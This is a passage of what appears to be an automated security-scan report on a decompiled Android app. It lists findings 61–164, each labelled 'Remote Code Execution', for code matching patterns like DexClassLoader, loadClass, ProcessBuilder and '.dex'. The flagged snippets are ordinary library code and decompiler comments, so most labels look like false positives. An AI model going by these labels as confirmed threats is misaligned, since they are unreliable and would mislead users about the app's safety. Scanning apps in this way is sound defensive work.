**61. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes14/com/tencent/smtt/sdk/t.smali`
- **Line:** 47

```java
    aput-object p1, v1, v4

    invoke-virtual {v0}, Lcom/tencent/smtt/export/external/DexLoader;->getClassLoader()Ldalvik/system/DexClassLoader;

    move-result-object p1
```

**62. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: \.dex
- **File:** `smali_classes22/androidx/multidex/MultiDex$V14.smali`
- **Line:** 39

```java
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const-string v0, "dalvik.system.DexPathList$Element"

    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
```

**63. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: \.dex
- **File:** `smali_classes22/androidx/multidex/MultiDex$V14.smali`
- **Line:** 223

```java
    invoke-virtual {v1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p0, ".dex"

    invoke-virtual {v1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
```

**64. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes3/com/tencent/smtt/services/ChildProcessService.smali`
- **Line:** 242

```java
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    new-instance v0, Ldalvik/system/DexClassLoader;

    const-class v5, Lcom/tencent/smtt/services/ChildProcessService;
```

**65. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes3/com/tencent/smtt/services/ChildProcessService.smali`
- **Line:** 250

```java
    move-result-object v5

    invoke-direct {v0, v3, v2, v2, v5}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    invoke-virtual {v0, v4}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
```

**66. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes3/com/tencent/smtt/services/ChildProcessService.smali`
- **Line:** 252

```java
    invoke-direct {v0, v3, v2, v2, v5}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    invoke-virtual {v0, v4}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0
```

**67. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: ProcessBuilder
- **File:** `smali_classes4/com/blankj/utilcode/util/DeviceUtils.smali`
- **Line:** 1504

```java
    move-result-object v0

    new-instance v1, Ljava/lang/ProcessBuilder;

    invoke-direct {v1, v0}, Ljava/lang/ProcessBuilder;-><init>([Ljava/lang/String;)V
```

**68. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: ProcessBuilder
- **File:** `smali_classes4/com/blankj/utilcode/util/DeviceUtils.smali`
- **Line:** 1506

```java
    new-instance v1, Ljava/lang/ProcessBuilder;

    invoke-direct {v1, v0}, Ljava/lang/ProcessBuilder;-><init>([Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/ProcessBuilder;->start()Ljava/lang/Process;
```

**69. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: ProcessBuilder
- **File:** `smali_classes4/com/blankj/utilcode/util/DeviceUtils.smali`
- **Line:** 1508

```java
    invoke-direct {v1, v0}, Ljava/lang/ProcessBuilder;-><init>([Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/ProcessBuilder;->start()Ljava/lang/Process;

    move-result-object v0
```

**70. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes4/androidx/multidex/MultiDex.smali`
- **Line:** 391

```java
    invoke-static {v2, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {p0}, Landroidx/multidex/MultiDex;->getDexClassloader(Landroid/content/Context;)Ljava/lang/ClassLoader;

    move-result-object v1
```

**71. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes4/androidx/multidex/MultiDex.smali`
- **Line:** 750

```java
.end method

.method private static getDexClassloader(Landroid/content/Context;)Ljava/lang/ClassLoader;
    .locals 3

```

**72. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali_classes4/androidx/multidex/MultiDex.smali`
- **Line:** 764

```java
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    instance-of v2, p0, Ldalvik/system/BaseDexClassLoader;

    if-eqz v2, :cond_0
```

**73. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes5/m/i.smali`
- **Line:** 138

```java

    :try_start_1
    invoke-virtual {p1, v1}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1
```

**74. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes5/com/tencent/smtt/sdk/QbSdk.smali`
- **Line:** 640

```java
    const-string v2, "com.tencent.tbs.sdk.extension.TbsSDKExtension"

    invoke-virtual {v5, v2}, Lcom/tencent/smtt/export/external/DexLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2
```

**75. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes5/com/tencent/smtt/sdk/QbSdk.smali`
- **Line:** 1454

```java
    const-string v0, "com.tencent.tbs.sdk.extension.TbsSDKExtension"

    invoke-virtual {p1, v0}, Lcom/tencent/smtt/export/external/DexLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object p1
```

**76. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes5/com/tencent/smtt/sdk/QbSdk.smali`
- **Line:** 3756

```java
    const-string v4, "com.tencent.tbs.sdk.extension.TbsSDKExtension"

    invoke-virtual {v2, v4}, Lcom/tencent/smtt/export/external/DexLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2
```

**77. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: loadClass
- **File:** `smali_classes2/com/tencent/smtt/sdk/TbsExtensionFunctionManager.smali`
- **Line:** 359

```java
    const-string v2, "com.tencent.smtt.tbs.bugly.TBSBuglyManager"

    invoke-virtual {v4, v2}, Lcom/tencent/smtt/export/external/DexLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2
```

**78. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: \.dex
- **File:** `smali_classes2/androidx/multidex/MultiDexExtractor.smali`
- **Line:** 21

```java
.field private static final DEX_PREFIX:Ljava/lang/String; = "classes"

.field public static final DEX_SUFFIX:Ljava/lang/String; = ".dex"

.field private static final EXTRACTED_NAME_EXT:Ljava/lang/String; = ".classes"
```

**79. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: \.dex
- **File:** `smali_classes2/androidx/multidex/MultiDexExtractor.smali`
- **Line:** 455

```java
    new-instance v2, Ljava/util/zip/ZipEntry;

    const-string v3, "classes.dex"

    invoke-direct {v2, v3}, Ljava/util/zip/ZipEntry;-><init>(Ljava/lang/String;)V
```

**80. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: \.dex
- **File:** `smali_classes2/androidx/multidex/MultiDexExtractor.smali`
- **Line:** 1067

```java

    :try_start_0
    const-string v6, "classes2.dex"

    :goto_0
```

**81. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali/com/tencent/smtt/export/external/DexClassLoaderProviderService.smali`
- **Line:** 1

```java
.class public Lcom/tencent/smtt/export/external/DexClassLoaderProviderService;
.super Landroid/app/Service;

```

**82. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali/com/tencent/smtt/export/external/DexClassLoaderProviderService.smali`
- **Line:** 35

```java
    const-string v0, "dexloader"

    const-string v1, "DexClassLoaderProviderService -- onCreate()"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
```

**83. Remote Code Execution Detected**
- **Description:** Suspicious pattern found: DexClassLoader
- **File:** `smali/com/tencent/smtt/export/external/DexClassLoaderProviderService.smali`
- **Line:** 41

```java
    const/4 v0, 0x1

    invoke-static {v0, p0}, Lcom/tencent/smtt/export/external/DexClassLoaderProvider;->setForceLoadDexFlag(ZLandroid/app/Service;)V

    return-void
```

**84. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/y2/a.java`
- **Line:** 3

```java
package y2;

/* loaded from: classes16.dex */
public abstract class a<T, ID> {
}

```

**85. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/b.java`
- **Line:** 20

```java

@RestrictTo({RestrictTo.Scope.LIBRARY_GROUP})
@UiThread
/* loaded from: classes19.dex */
public final class b<T extends h<T>> {

    /* renamed from: a, reason: collision with root package name */
```

**86. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/b.java`
- **Line:** 38

```java
    /* renamed from: e, reason: collision with root package name */
    public boolean f5563e;

    /* loaded from: classes15.dex */
    public interface a {
    }

```

**87. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/n.java`
- **Line:** 14

```java
import java.util.List;

@RestrictTo({RestrictTo.Scope.LIBRARY})
/* loaded from: classes21.dex */
public final class n {

    /* renamed from: a, reason: collision with root package name */
```

**88. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/n.java`
- **Line:** 20

```java
    /* renamed from: a, reason: collision with root package name */
    public static final Comparator<View> f5635a = new a();

    /* loaded from: classes25.dex */
    public class a implements Comparator<View> {
        @Override // java.util.Comparator
        public final int compare(View view, View view2) {
```

**89. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/o.java`
- **Line:** 6

```java
import android.view.View;
import android.view.inputmethod.InputMethodManager;

/* loaded from: classes23.dex */
public final class o implements Runnable {

    /* renamed from: b, reason: collision with root package name */
```

**90. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/c.java`
- **Line:** 5

```java

import y1.a;

/* loaded from: classes2.dex */
public final class c implements a.InterfaceC0086a {

    /* renamed from: a, reason: collision with root package name */
```

**91. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/h.java`
- **Line:** 10

```java
import v1.h;

@RestrictTo({RestrictTo.Scope.LIBRARY_GROUP})
/* loaded from: classes8.dex */
public interface h<T extends h<T>> extends Checkable {

    /* loaded from: classes25.dex */
```

**92. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/h.java`
- **Line:** 13

```java
/* loaded from: classes8.dex */
public interface h<T extends h<T>> extends Checkable {

    /* loaded from: classes25.dex */
    public interface a<C> {
    }

```

**93. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/d.java`
- **Line:** 33

```java
import v1.j;

@RestrictTo({RestrictTo.Scope.LIBRARY_GROUP})
/* loaded from: classes11.dex */
public final class d {

    @Nullable
```

**94. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/q.java`
- **Line:** 7

```java
import androidx.annotation.NonNull;
import androidx.core.view.ViewCompat;

/* loaded from: classes24.dex */
public final class q implements View.OnAttachStateChangeListener {
    @Override // android.view.View.OnAttachStateChangeListener
    public final void onViewAttachedToWindow(@NonNull View view) {
```

**95. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/p.java`
- **Line:** 6

```java
import androidx.core.view.OnApplyWindowInsetsListener;
import v1.r;

/* loaded from: classes9.dex */
public final class p implements OnApplyWindowInsetsListener {

    /* renamed from: a, reason: collision with root package name */
```

**96. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/e.java`
- **Line:** 13

```java
import androidx.annotation.RestrictTo;

@RestrictTo({RestrictTo.Scope.LIBRARY_GROUP})
/* loaded from: classes15.dex */
public final class e {

    /* renamed from: a, reason: collision with root package name */
```

**97. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/i.java`
- **Line:** 11

```java
import java.util.ArrayList;

@RestrictTo({RestrictTo.Scope.LIBRARY_GROUP})
/* loaded from: classes5.dex */
public final class i {

    /* renamed from: a, reason: collision with root package name */
```

**98. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/i.java`
- **Line:** 28

```java
    /* renamed from: d, reason: collision with root package name */
    public final a f5606d = new a();

    /* loaded from: classes25.dex */
    public class a extends AnimatorListenerAdapter {
        public a() {
        }
```

**99. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/i.java`
- **Line:** 42

```java
        }
    }

    /* loaded from: classes15.dex */
    public static class b {

        /* renamed from: a, reason: collision with root package name */
```

**100. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/j.java`
- **Line:** 16

```java
import java.lang.reflect.Constructor;

@RestrictTo({RestrictTo.Scope.LIBRARY_GROUP})
/* loaded from: classes2.dex */
public final class j {

    /* renamed from: m, reason: collision with root package name */
```

**101. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/j.java`
- **Line:** 70

```java
    @Nullable
    public TextUtils.TruncateAt f5625l = null;

    /* loaded from: classes4.dex */
    public static class a extends Exception {
        /* JADX WARN: Illegal instructions before constructor call */
        /*
```

**102. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/s.java`
- **Line:** 9

```java

@SuppressLint({"AppCompatCustomView"})
@RestrictTo({RestrictTo.Scope.LIBRARY_GROUP})
/* loaded from: classes25.dex */
public class s extends ImageButton {

    /* renamed from: b, reason: collision with root package name */
```

**103. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/f.java`
- **Line:** 16

```java
import comeliest.metempsychosis.pokelogan.R;

@RestrictTo({RestrictTo.Scope.LIBRARY_GROUP})
/* loaded from: classes25.dex */
public class f extends ViewGroup {

    /* renamed from: b, reason: collision with root package name */
```

**104. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/g.java`
- **Line:** 19

```java
import androidx.core.view.GravityCompat;

@RestrictTo({RestrictTo.Scope.LIBRARY_GROUP})
/* loaded from: classes8.dex */
public class g extends LinearLayoutCompat {

    /* renamed from: b, reason: collision with root package name */
```

**105. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/r.java`
- **Line:** 9

```java
import androidx.core.view.ViewCompat;

@RestrictTo({RestrictTo.Scope.LIBRARY_GROUP})
/* loaded from: classes18.dex */
public final class r {

    /* loaded from: classes21.dex */
```

**106. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/r.java`
- **Line:** 12

```java
/* loaded from: classes18.dex */
public final class r {

    /* loaded from: classes21.dex */
    public interface a {
    }

```

**107. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/r.java`
- **Line:** 16

```java
    public interface a {
    }

    /* loaded from: classes19.dex */
    public static class b {

        /* renamed from: a, reason: collision with root package name */
```

**108. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/k.java`
- **Line:** 11

```java
import java.lang.ref.WeakReference;

@RestrictTo({RestrictTo.Scope.LIBRARY_GROUP})
/* loaded from: classes10.dex */
public final class k {

    /* renamed from: c, reason: collision with root package name */
```

**109. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/k.java`
- **Line:** 34

```java
    /* renamed from: d, reason: collision with root package name */
    public boolean f5629d = true;

    /* loaded from: classes2.dex */
    public class a extends y1.f {
        public a() {
        }
```

**110. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/k.java`
- **Line:** 63

```java
        }
    }

    /* loaded from: classes2.dex */
    public interface b {
        void a();

```

**111. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/l.java`
- **Line:** 9

```java
import androidx.annotation.RestrictTo;

@RestrictTo({RestrictTo.Scope.LIBRARY_GROUP})
/* loaded from: classes9.dex */
public class l implements TextWatcher {
    @Override // android.text.TextWatcher
    public void afterTextChanged(@NonNull Editable editable) {
```

**112. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/m.java`
- **Line:** 15

```java
import comeliest.metempsychosis.pokelogan.R;

@RestrictTo({RestrictTo.Scope.LIBRARY_GROUP})
/* loaded from: classes2.dex */
public final class m {

    /* renamed from: a, reason: collision with root package name */
```

**113. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/v1/a.java`
- **Line:** 5

```java

import v1.h;

/* loaded from: classes17.dex */
public final class a implements h.a<h<Object>> {

    /* renamed from: a, reason: collision with root package name */
```

**114. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/b.java`
- **Line:** 3

```java
package z3;

/* loaded from: classes16.dex */
public enum b {
    NO_ERROR(0),
    PROTOCOL_ERROR(1),
```

**115. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/n.java`
- **Line:** 3

```java
package z3;

/* loaded from: classes15.dex */
public final class n extends v3.a {

    /* renamed from: e, reason: collision with root package name */
```

**116. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/o.java`
- **Line:** 20

```java
import s3.y;
import z3.q;

/* loaded from: classes4.dex */
public final class o implements x3.d {

    /* renamed from: g, reason: collision with root package name */
```

**117. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/v.java`
- **Line:** 7

```java
import kotlin.jvm.JvmField;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes17.dex */
public final class v extends IOException {

    /* renamed from: b, reason: collision with root package name */
```

**118. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/c.java`
- **Line:** 7

```java
import kotlin.jvm.JvmField;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes10.dex */
public final class c {

    /* renamed from: d, reason: collision with root package name */
```

**119. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/h.java`
- **Line:** 7

```java
import java.io.IOException;
import z3.f;

/* loaded from: classes15.dex */
public final class h extends v3.a {

    /* renamed from: e, reason: collision with root package name */
```

**120. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/d.java`
- **Line:** 18

```java
import kotlin.jvm.internal.Intrinsics;
import z3.s;

/* loaded from: classes9.dex */
public final class d {

    /* renamed from: a, reason: collision with root package name */
```

**121. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/d.java`
- **Line:** 30

```java
    /* renamed from: c, reason: collision with root package name */
    public static final d f6183c = new d();

    /* loaded from: classes7.dex */
    public static final class a {

        /* renamed from: a, reason: collision with root package name */
```

**122. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/d.java`
- **Line:** 254

```java
        }
    }

    /* loaded from: classes23.dex */
    public static final class b {

        /* renamed from: a, reason: collision with root package name */
```

**123. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/q.java`
- **Line:** 14

```java
import kotlin.Unit;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes19.dex */
public final class q {

    /* renamed from: a, reason: collision with root package name */
```

**124. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/q.java`
- **Line:** 59

```java
    /* renamed from: n, reason: collision with root package name */
    public final f f6308n;

    /* loaded from: classes20.dex */
    public final class a implements y {

        /* renamed from: b, reason: collision with root package name */
```

**125. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/q.java`
- **Line:** 168

```java
        }
    }

    /* loaded from: classes24.dex */
    public final class b implements a0 {

        /* renamed from: b, reason: collision with root package name */
```

**126. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/q.java`
- **Line:** 292

```java
        }
    }

    /* loaded from: classes13.dex */
    public final class c extends f4.c {
        public c() {
        }
```

**127. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/p.java`
- **Line:** 16

```java
import kotlin.ranges.RangesKt;
import z3.d;

/* loaded from: classes6.dex */
public final class p implements Closeable {

    /* renamed from: f, reason: collision with root package name */
```

**128. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/p.java`
- **Line:** 37

```java
    /* renamed from: e, reason: collision with root package name */
    public final boolean f6288e;

    /* loaded from: classes24.dex */
    public static final class a {
        public final int a(int i5, int i6, int i7) {
            if ((i6 & 8) != 0) {
```

**129. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/p.java`
- **Line:** 50

```java
        }
    }

    /* loaded from: classes3.dex */
    public static final class b implements a0 {

        /* renamed from: b, reason: collision with root package name */
```

**130. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/p.java`
- **Line:** 126

```java
        }
    }

    /* loaded from: classes20.dex */
    public interface c {
        void a(int i5, List list);

```

**131. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/e.java`
- **Line:** 7

```java
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.StringsKt__StringsJVMKt;

/* loaded from: classes7.dex */
public final class e {

    /* renamed from: d, reason: collision with root package name */
```

**132. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/i.java`
- **Line:** 10

```java
import kotlin.jvm.internal.Ref;
import z3.f;

/* loaded from: classes14.dex */
public final class i extends v3.a {

    /* renamed from: e, reason: collision with root package name */
```

**133. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/j.java`
- **Line:** 7

```java
import java.util.Objects;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes19.dex */
public final class j extends v3.a {

    /* renamed from: e, reason: collision with root package name */
```

**134. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/s.java`
- **Line:** 7

```java
import kotlin.collections.ArraysKt;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes24.dex */
public final class s {

    /* renamed from: a, reason: collision with root package name */
```

**135. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/s.java`
- **Line:** 22

```java
    /* renamed from: d, reason: collision with root package name */
    public static final s f6330d;

    /* loaded from: classes20.dex */
    public static final class a {

        /* renamed from: a, reason: collision with root package name */
```

**136. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/f.java`
- **Line:** 19

```java
import kotlin.jvm.internal.Intrinsics;
import z3.p;

/* loaded from: classes10.dex */
public final class f implements Closeable {
    public static final u C;
    public static final c D = new c();
```

**137. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/f.java`
- **Line:** 101

```java
    /* renamed from: z, reason: collision with root package name */
    public final r f6230z;

    /* loaded from: classes18.dex */
    public static final class a extends v3.a {

        /* renamed from: e, reason: collision with root package name */
```

**138. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/f.java`
- **Line:** 141

```java
        }
    }

    /* loaded from: classes11.dex */
    public static final class b {

        /* renamed from: a, reason: collision with root package name */
```

**139. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/f.java`
- **Line:** 180

```java
        }
    }

    /* loaded from: classes3.dex */
    public static final class c {
    }

```

**140. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/f.java`
- **Line:** 184

```java
    public static final class c {
    }

    /* loaded from: classes19.dex */
    public static abstract class d {

        /* renamed from: a, reason: collision with root package name */
```

**141. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/g.java`
- **Line:** 6

```java
import kotlin.jvm.internal.Ref;
import z3.f;

/* loaded from: classes19.dex */
public final class g extends v3.a {

    /* renamed from: e, reason: collision with root package name */
```

**142. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/r.java`
- **Line:** 12

```java
import kotlin.jvm.internal.Intrinsics;
import z3.d;

/* loaded from: classes16.dex */
public final class r implements Closeable {

    /* renamed from: h, reason: collision with root package name */
```

**143. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/k.java`
- **Line:** 8

```java
import java.util.Objects;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes21.dex */
public final class k extends v3.a {

    /* renamed from: e, reason: collision with root package name */
```

**144. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/u.java`
- **Line:** 5

```java

import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes8.dex */
public final class u {

    /* renamed from: a, reason: collision with root package name */
```

**145. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/l.java`
- **Line:** 8

```java
import java.util.Objects;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes6.dex */
public final class l extends v3.a {

    /* renamed from: e, reason: collision with root package name */
```

**146. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/m.java`
- **Line:** 7

```java
import kotlin.Unit;
import kotlin.jvm.internal.Intrinsics;

/* loaded from: classes13.dex */
public final class m extends v3.a {

    /* renamed from: e, reason: collision with root package name */
```

**147. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/a.java`
- **Line:** 5

```java

import java.io.IOException;

/* loaded from: classes12.dex */
public final class a extends IOException {
}

```

**148. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z3/t.java`
- **Line:** 5

```java

import kotlin.jvm.JvmField;

/* loaded from: classes22.dex */
public interface t {

    /* renamed from: d, reason: collision with root package name */
```

**149. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/u0/a.java`
- **Line:** 6

```java
import java.util.Collections;
import java.util.List;

/* loaded from: classes15.dex */
public final class a {

    /* renamed from: a, reason: collision with root package name */
```

**150. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/p3/a.java`
- **Line:** 6

```java
import kotlin.jvm.JvmField;
import q3.r;

/* loaded from: classes7.dex */
public final class a {

    /* renamed from: a, reason: collision with root package name */
```

**151. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s2/b.java`
- **Line:** 6

```java
import android.os.CancellationSignal;
import k.j0;

/* loaded from: classes13.dex */
public final class b extends j0 {

    public static class a {
```

**152. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/s2/a.java`
- **Line:** 3

```java
package s2;

/* loaded from: classes13.dex */
public final class a {

    /* renamed from: a, reason: collision with root package name */
```

**153. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/u1/b.java`
- **Line:** 6

```java
import android.view.ViewTreeObserver;
import com.google.android.material.floatingactionbutton.d;

/* loaded from: classes25.dex */
public final class b implements ViewTreeObserver.OnPreDrawListener {

    /* renamed from: b, reason: collision with root package name */
```

**154. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/u1/c.java`
- **Line:** 18

```java
import java.util.ArrayList;

@RequiresApi(21)
/* loaded from: classes14.dex */
public final class c extends d {
    public c(FloatingActionButton floatingActionButton, a2.b bVar) {
        super(floatingActionButton, bVar);
```

**155. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/u1/a.java`
- **Line:** 6

```java
import android.animation.FloatEvaluator;
import android.animation.TypeEvaluator;

/* loaded from: classes5.dex */
public final class a implements TypeEvaluator<Float> {

    /* renamed from: a, reason: collision with root package name */
```

**156. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z2/b.java`
- **Line:** 3

```java
package z2;

/* loaded from: classes14.dex */
public final class b {
}

```

**157. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z2/c.java`
- **Line:** 5

```java

import java.util.List;

/* loaded from: classes6.dex */
public final class c<T, ID> extends k<T, ID> {
    public c(u2.c cVar, d3.c<T, ID> cVar2, t2.g<T, ID> gVar) {
        super(cVar, cVar2, gVar, 5);
```

**158. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z2/h.java`
- **Line:** 9

```java
import java.util.Objects;
import org.apache.commons.io.FilenameUtils;

/* loaded from: classes25.dex */
public final class h<T, ID> extends k<T, ID> {

    /* renamed from: i, reason: collision with root package name */
```

**159. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z2/d.java`
- **Line:** 3

```java
package z2;

/* loaded from: classes17.dex */
public interface d<T> {
    T a(c3.e eVar);
}
```

**160. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z2/e.java`
- **Line:** 3

```java
package z2;

/* loaded from: classes14.dex */
public interface e<T> extends g<T> {
}

```

**161. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z2/i.java`
- **Line:** 5

```java

import java.sql.SQLException;

/* loaded from: classes7.dex */
public final class i implements a {

    /* renamed from: a, reason: collision with root package name */
```

**162. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z2/j.java`
- **Line:** 6

```java
import java.sql.SQLException;
import java.util.Objects;

/* loaded from: classes5.dex */
public final class j<T, ID> implements t2.f<T> {

    /* renamed from: n, reason: collision with root package name */
```

**163. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z2/f.java`
- **Line:** 3

```java
package z2;

/* loaded from: classes10.dex */
public interface f<T> extends g<T> {
}

```

**164. Remote Code Execution**
- **Description:** Pattern detected: .dex
- **File:** `sources/z2/g.java`
- **Line:** 3

```java
package z2;

